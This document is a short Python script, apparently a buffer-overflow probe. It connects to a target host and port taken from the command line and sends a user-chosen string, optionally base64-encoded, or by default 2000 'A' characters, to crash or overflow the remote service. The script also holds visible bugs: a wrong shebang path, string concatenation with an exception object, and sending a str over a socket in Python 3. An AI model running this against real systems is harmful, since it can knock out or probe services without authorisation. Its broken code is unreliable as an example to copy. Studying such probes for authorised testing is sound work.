#!/usr/env/python
import socket
import base64
import sys

# Python2 compatability
try: input = raw_input
except:	pass

def boffer(string):
	try:
		target = sys.argv[1]
		port = int(sys.argv[2])
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print("[*] Connecting to %s on port %s" % (str(target),str(port)))
		s.connect((target, port))
		print("[*] Sending payload...")
		s.send(string)
		print(s.recv(1024))
		print("[*] Done")
		sys.exit()
	except socket.error:
		print("[!] Oops! Seems that the host entered does not allow connections!")
		print("[i] Target [%s] Port [%s]" % (str(target),str(port)))
		sys.exit()
	except Exception as error:
		print("ERROR INCOMING!!!")
		print("[ "+ error + " ]")
		sys.exit()

def encode_b64(string):
	return base64.b64encode(string)

def decode_b64(string):
	return base64.b64decode(string)

def main():
	try:
		if len(sys.argv) == 3:
			string = input("Enter the text or string to use:\n>>> ")
			if len(string) == 0:
				string = "A" * 2000
				boffer(string)
			else:
				cipher = input("Do you want to encode or keep the string decoded? (y == encode // n == keep decoded) ").lower()
				if cipher == 'y':
					string = encode_b64(string)
					boffer(string)
				else:
					boffer(string)
		else:
			print("Incorrect syntax")
			print("\nUsage: python %s <target> <port>"%str(sys.argv[0]))
			sys.exit()

	except KeyboardInterrupt:
		sys.exit("\n")


if __name__ == "__main__":
	main()
